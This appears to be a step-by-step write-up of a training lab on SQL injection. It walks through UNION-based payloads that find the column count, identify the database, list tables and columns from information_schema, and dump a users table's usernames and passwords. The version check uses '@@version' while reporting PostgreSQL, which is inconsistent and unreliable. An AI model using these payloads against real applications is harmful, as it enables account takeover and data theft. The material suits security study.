## End Goal: Login as `administrator`



## Burp

GET /filter?category=Pets HTTP/2


## Finding the number of columns

`pets ' union select null , null --`

number of columns = 2

## Finding the column of string datatype

`Pets ' union select 'a' , 'a' --`

both column were of string datatype


## finding the type of database

`pets ' union select @@version , null --`

we found database is PostgreSQL


## Finding the database contents

 PostgreSQL 	
 		SELECT * FROM information_schema.tables
		SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE


outputing contents from information_schema.tables
`pets ' union select table_name , null from information_schema.tables --`
this list all the table name
among which we will look into table `users_yripss`


outputing contents of table `users_yripss`
`' union SELECT column_name , null FROM information_schema.columns WHERE table_name = 'users_yripss' --`

we found two columns : password_xypzvr  & username_bjxspf


outputing contents of password_xypzvr  & username_bjxspf column from table users_yripss
`' union select password_xypzvr  , username_bjxspf from users_yripss --`















